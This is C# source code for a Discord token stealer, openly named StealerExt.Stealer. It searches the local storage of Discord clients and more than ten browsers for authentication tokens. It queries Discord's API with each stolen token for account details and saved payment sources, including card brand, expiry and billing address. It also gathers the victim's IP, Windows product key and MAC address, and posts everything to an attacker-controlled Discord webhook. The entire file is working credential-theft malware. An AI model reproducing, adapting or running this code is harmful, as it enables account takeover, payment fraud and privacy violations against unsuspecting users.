using Leaf.xNet;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using Discord;
using Discord.Webhook;
using System.Management;
using System.Threading.Tasks;
using System.Net.NetworkInformation;

namespace StealerExt
{
    public class Stealer
	{
		private static List<string> TokenStealer(DirectoryInfo Folder, bool checkLogs = false)
		{
			List<string> list = new List<string>();
			try
			{
				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.ldb");
				for (int i = 0; i < files.Length; i++)
				{
					string input = files[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
					{
						SaveTokensAsync(TokenCheckAccess(((Match)obj).Value));
					}
				}
			}
			catch{}
            try
            {
				FileInfo[] firefox = Folder.GetFiles(checkLogs ? "*.log" : "*.sqlite");
				for (int i = 0; i < firefox.Length; i++)
				{
					string input = firefox[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
					{
						SaveTokensAsync(TokenCheckAccess(((Match)obj).Value));
					}
				}
			}
            catch { }
			list = list.Distinct().ToList();
			if (list.Count > 0)
			{
				int index = list.Count - 1;
				list[index] = list[index] ?? "";
			}
			Canary = false;
			PTB = false;
			Opera = false;
			Chrome = false;
			App = false;
			Edge = false;
			OperaGX = false;
			Firefox = false;
			Vivaldi = false;
			Brave = false;
			Yandex = false;
			Development = false;
			Brave_Nightly = false;
			return list;
		}

		private static async Task<string> SaveTokensAsync(string token)
		{
			if (!(token == ""))
			{
				string text;
				if (Chrome)
				{
					text = "Chrome";
				}
				else if (Edge)
				{
					text = "Edge";
				}
				else if (Opera)
				{
					text = "Opera";
				}
				else if (Canary)
				{
					text = "Discord Canary";
				}
				else if (App)
				{
					text = "Discord App";
				}
				else if (PTB)
				{
					text = "Discord PTB";
				}
				else if (OperaGX)
				{
					text = "Opera GX";
				}
				else if (Brave)
				{
					text = "Brave";
				}
				else if (Brave_Nightly)
				{
					text = "Brave Nightly";
				}
				else if (Yandex)
				{
					text = "Yandex";
				}
				else if (Vivaldi)
				{
					text = "Vivaldi";
				}
				else if (Development)
                {
					text = "Discord Development";
                }
				else if (Firefox)
                {
					text = "FireFox";
                }
				else
				{
					text = "Unknown";
				}
				if (!Found)
                {
					var request = new HttpRequest();
					{
						bool flag = false;
						request.UseCookies = false;
						request.AddHeader("Authorization", token);
						request.Get("https://discordapp.com/api/v8/users/@me");
						string test = request.Response.ToString();
						dynamic test2 = JsonConvert.DeserializeObject(test);
						if (test2.premium_type == 1)
						{
							test2.premium_type = "Nitro Classic";
						}
						else if (test2.premium_type == 2)
						{
							test2.premium_type = "Discord Nitro";
						}
						else if (test2.premium_type == 0)
						{
							test2.premium_type = "None";
						}
						else
						{
							test2.premium_type = "None";
						}
						if (test2.phone == null)
						{
							test2.phone = "None";
						}
						var r = new HttpRequest();
                        dynamic payment = null;
                        string pay;
                        try
                        {
                            r.UseCookies = false;
                            r.AddHeader("Authorization", token);
                            r.Get("https://discord.com/api/v8/users/@me/billing/payment-sources");
                            pay = r.Response.ToString();
                            pay = pay.Replace("[", "");
                            pay = pay.Replace("]", "");
                            payment = JsonConvert.DeserializeObject(pay);
                        }
                        catch
                        {
                            pay = null;
                            flag = true;
                        }
						try
						{
							ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
							string OSName = null;
							foreach (ManagementObject managementObject in mos.Get())
							{
								OSName = managementObject["Caption"].ToString();
							}
							string IP = new WebClient().DownloadString("https://ipecho.net/plain");
							using (var sEmbed = new DiscordWebhookClient(Hook))
							{
								var embed = new EmbedBuilder
								{
									Title = $"User: {Environment.UserName}",
									Color = new Color(0x36393f)
								};
								embed.AddField("IP:", IP, true);
								embed.AddField("Windows Version:", OSName, true);
								embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
								embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
								embed.AddField("__Token Info__", $"Username | {test2.username}#{test2.discriminator}\nID | {test2.id}\nNitro | {test2.premium_type}\nEmail | {test2.email}\nPhone | {test2.phone}\nVerified | {test2.verified}\nMFA | {test2.mfa_enabled}\nLanguage | {test2.locale}\nFlags | {test2.flags}\n{text} Token | ||{token}||");
								if (pay.Contains("email") & !flag)
								{
									embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
								}
								else if (pay.Contains("mastercard") || pay.Contains("visa")) embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
								else if (flag)
								{
									embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed To Parse Other Info");
									flag = false;
								}
								else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
								await sEmbed.SendMessageAsync(embeds: new[] { embed.Build() });
								Found = true;
							}
						}
						catch
						{
							try
							{ 
								ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
								string OSName = null;
								foreach (ManagementObject managementObject in mos.Get())
								{
									OSName = managementObject["Caption"].ToString();
								}
								string IP = new WebClient().DownloadString("https://ipecho.net/plain");
								using (var sEmbed = new DiscordWebhookClient(Hook))
								{
									var embed = new EmbedBuilder
									{
										Title = $"User: {Environment.UserName}",
										Color = new Color(0x36393f)
									};
									embed.AddField("IP:", IP, true);
									embed.AddField("Windows Version:", OSName, true);
									embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
									embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
									embed.AddField("__Token Info__", $"Username | {test2.username}#{test2.discriminator}\nID | {test2.id}\nNitro | {test2.premium_type}\nEmail | {test2.email}\nPhone | {test2.phone}\nVerified | {test2.verified}\nMFA | {test2.mfa_enabled}\nLanguage | {test2.locale}\nFlags | {test2.flags}\n{text} Token | ||{token}||");
									embed.AddField("__Payment Info__", "Has Payment | Unknown\nFailed To Parse Other Info [Might be invalid card(s)]");
									await sEmbed.SendMessageAsync(embeds: new[] { embed.Build() });
									Found = true;
								}
							}
							catch (Exception x) { await new Webhook(Hook).SendAsync("```\n" + text + " Token " + token + "\n```").ConfigureAwait(false); await new Webhook(Hook).SendAsync($"```{x}```").ConfigureAwait(false); }
						}
						CheckedTokens.Add(token);
					}
				}
				if (Found & !CheckedTokens.Contains(token))
                {
					var request = new HttpRequest();
					{
						bool flag = false;
						request.UseCookies = false;
						request.AddHeader("Authorization", token);
						request.Get("https://discordapp.com/api/v8/users/@me");
						string test = request.Response.ToString();
						dynamic test2 = JsonConvert.DeserializeObject(test);
						if (test2.premium_type == 1)
						{
							test2.premium_type = "Nitro Classic";
						}
						else if (test2.premium_type == 2)
						{
							test2.premium_type = "Discord Nitro";
						}
						else if (test2.premium_type == 0)
						{
							test2.premium_type = "None";
						}
						else
						{
							test2.premium_type = "None";
						}
						if (test2.phone == null)
						{
							test2.phone = "None";
						}
						var r = new HttpRequest();
						string pay;
						dynamic payment = null;
						try
						{
							r.UseCookies = false;
							r.AddHeader("Authorization", token);
							r.Get("https://discord.com/api/v8/users/@me/billing/payment-sources");
							pay = r.Response.ToString();
							pay = pay.Replace("[", "");
							pay = pay.Replace("]", "");
							payment = JsonConvert.DeserializeObject(pay);
						}
						catch
						{
							pay = null;
							flag = true;
						}
						try
						{
							using (var sEmbed = new DiscordWebhookClient(Hook))
							{
								var embed = new EmbedBuilder
								{
									Title = $"User: {Environment.UserName}",
									Color = new Color(0x36393f)
								};
								embed.AddField("__Token Info__", $"Username | {test2.username}#{test2.discriminator}\nID | {test2.id}\nNitro | {test2.premium_type}\nEmail | {test2.email}\nPhone | {test2.phone}\nVerified | {test2.verified}\nMFA | {test2.mfa_enabled}\nLanguage | {test2.locale}\nFlags | {test2.flags}\n{text} Token | ||{token}||");
								if (pay.Contains("email") & !flag)
								{
									embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
								}
								else if (pay.Contains("mastercard") || pay.Contains("visa")) embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
								else if (flag)
								{
									embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed To Parse Other Info");
									flag = false;
								}
								else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
								await sEmbed.SendMessageAsync(embeds: new[] { embed.Build() });
							}
						}
						catch
						{
							try
							{
								using (var sEmbed = new DiscordWebhookClient(Hook))
								{
									var embed = new EmbedBuilder
									{
										Title = $"User: {Environment.UserName}",
										Color = new Color(0x36393f)
									};
									embed.AddField("__Token Info__", $"Username | {test2.username}#{test2.discriminator}\nID | {test2.id}\nNitro | {test2.premium_type}\nEmail | {test2.email}\nPhone | {test2.phone}\nVerified | {test2.verified}\nMFA | {test2.mfa_enabled}\nLanguage | {test2.locale}\nFlags | {test2.flags}\n{text} Token | ||{token}||");
									embed.AddField("__Payment Info__", "Has Payment | Unknown\nFailed To Parse Other Info [Might be invalid card(s)]");
									await sEmbed.SendMessageAsync(embeds: new[] { embed.Build() });
									Found = true;
								}
							}
							catch (Exception x) { await new Webhook(Hook).SendAsync("```\n" + text + " Token " + token + "\n```").ConfigureAwait(false); await new Webhook(Hook).SendAsync($"```{x.Message}```"); }
						}
						CheckedTokens.Add(token);
					}
				}
			}
			return token;
		}

		private static string TokenCheckAccess(string token)
		{
            try
            {
				var wc = new WebClient();
				wc.Headers.Add("Content-Type", "application/json");
				wc.Headers.Add(HttpRequestHeader.Authorization, token);
				wc.DownloadString("https://discordapp.com/api/v8/users/@me/guilds");
			}
            catch (WebException ex)
            {
                string text = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                if (text.Contains("401: Unauthorized"))
                {
                    token = "";
                }
                else if (text.Contains("You need to verify your account in order to perform this action."))
                {
                    token = "";
                }
                else
                {
					token = "";
                }
            }
            return token;
		}
		public static void StartSteal()
		{
			try
			{
				StealTokenFromChrome();
				StealTokenFromOpera();
				StealTokenFromOperaGX();
				StealTokenFromEdge();
				StealTokenFromBrave();
				StealTokenFromBraveNightly();
				StealTokenFromYandex();
				StealTokenFromDiscordApp();
				StealTokenFromDiscordPtbApp();
				StealTokenFromDiscordCanaryApp();
				StealTokenFromVivaldi();
				StealTokenFromFirefox();
				StealTokenFromDiscordDev();
				SendAsync();
            }
			catch (Exception x)
			{
				new API(API.wHook)
				{
					_name = API.name,
					_ppUrl = API.pfp
				}.SendSysInfo("Exception: " + x, null);
			}
		}

		private static async Task SendAsync()
		{
			if (Found == false)
            {
				ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
				string OSName = null;
				foreach (ManagementObject managementObject in mos.Get())
				{
					OSName = managementObject["Caption"].ToString();
				}
				string IP = new WebClient().DownloadString("https://ipecho.net/plain");
				using (var sEmbed = new DiscordWebhookClient(Hook))
				{
					var embed = new EmbedBuilder
					{
						Title = $"{Environment.UserName}'s Token",
						Color = new Color(0x36393f)
					};
					embed.AddField("IP:", IP, true);
					embed.AddField("Windows Version:", OSName, true);
					embed.AddField("Product Key", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
					embed.AddField("Token?", "No token was found due to recent password change or Discord not being found in any of the supported platforms!");
					await sEmbed.SendMessageAsync(embeds: new[] { embed.Build() });
				}
			}
		}

		private static void StealTokenFromDiscordApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				App = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					App = true;
				}
			}
		}

		private static void StealTokenFromDiscordDev()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discorddevelopment\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				App = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					App = true;
				}
			}
		}

		private static void StealTokenFromDiscordCanaryApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Canary = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Canary = true;
				}
			}
		}
		private static void StealTokenFromDiscordPtbApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				PTB = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					PTB = true;
				}
			}
		}

		private static void StealTokenFromChrome()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Chrome = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Chrome = true;
				}
			}
		}

		private static void StealTokenFromBrave()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Brave = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Brave = true;
				}
			}
		}

		private static void StealTokenFromBraveNightly()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser-Nightly\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Brave_Nightly = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Brave_Nightly = true;
				}
			}
		}

		private static void StealTokenFromOpera()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Opera = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Opera = true;
				}
			}
		}

		private static void StealTokenFromVivaldi()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Vivaldi = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Vivaldi = true;
				}
			}
		}
		private static void StealTokenFromOperaGX()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				OperaGX = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					OperaGX = true;
				}
			}
		}

		private static void StealTokenFromEdge()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Edge = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Edge = true;
				}
			}
		}

		private static void StealTokenFromYandex()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Yandex = true;
				List<string> list = TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Yandex = true;
				}
			}
		}

		private static void StealTokenFromFirefox()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
			if (Directory.Exists(path))
			{
				foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
				{
					Firefox = true;
					List<string> list = TokenStealer(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), false);
					if (list != null && list.Count > 0)
					{
						Firefox = true;
					}
				}
			}
		}

		private static List<string> CheckedTokens = new List<string>();

		public static string Hook = API.wHook;

		private static bool Development = false;

		private static bool Edge = false;

		private static bool App = false;

		private static bool Canary = false;

		private static bool PTB = false;

		private static bool Chrome = false;

		private static bool Opera = false;

		private static bool OperaGX = false;

		private static bool Vivaldi = false;

		private static bool Brave = false;

		private static bool Yandex = false;

		private static bool Firefox = false;

		private static bool Brave_Nightly = false;

		private static bool Found = false;
	}
}
